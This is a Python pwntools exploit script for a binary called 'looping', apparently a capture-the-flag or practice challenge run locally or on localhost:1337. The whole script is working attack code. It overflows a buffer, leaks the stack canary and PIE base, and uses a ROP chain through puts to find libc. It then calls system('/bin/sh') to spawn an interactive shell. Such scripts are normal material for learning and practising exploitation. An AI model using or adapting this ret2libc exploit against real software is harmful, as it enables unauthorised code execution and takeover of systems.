from pwn import *
from pprint import pprint
#context.log_level='debug'

p = process("./looping")
elf = ELF("./looping", checksec=False)
#rop = ROP(elf)
libc = elf.libc

def start():
	if not args.REMOTE:
		return process("./looping")
	else:
		return remote("localhost", 1337)

p = start()

def main():

	global rop

	#pop_rdi = 0x9f3 # pop rdi; ret -> offset
	#main = 0x88a # main -> offset

	p.sendline("A"*0x48)
	p.recvline()

	canary = u64("\x00" + p.recv(7))
	pie_leak = u64(p.recv(6).ljust(8, "\x00")) - 0x990

	log.info("Canary: " + hex(canary))
	log.info("PIE: " + hex(pie_leak))

	pop_rdi = pie_leak + 0x9f3
	main = pie_leak + 0x88a

	payload = ""
	payload += "A"*0x48
	payload += p64(canary)
	payload += "B"*8
	payload += p64(pop_rdi)
	payload += p64(pie_leak + elf.got['puts'])
	payload += p64(pie_leak + elf.plt['puts'])
	payload += p64(main)

	p.sendline(payload)

	p.recvline()
	p.recvline()
	p.recvline()

	leaked_puts = u64(p.recv(6).ljust(8, "\x00"))
	log.info("puts@: " + hex(leaked_puts))

	libc.address = leaked_puts - libc.symbols['puts']
	log.info("LIBC@: " + hex(libc.address))

	system = libc.symbols['system']
	bin_sh = next(libc.search("/bin/sh"))

	payload = ""
	payload += "A"*0x48
	payload += p64(canary)
	payload += "B"*8
	payload += p64(pop_rdi)
	payload += p64(bin_sh)
	payload += p64(system)

	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
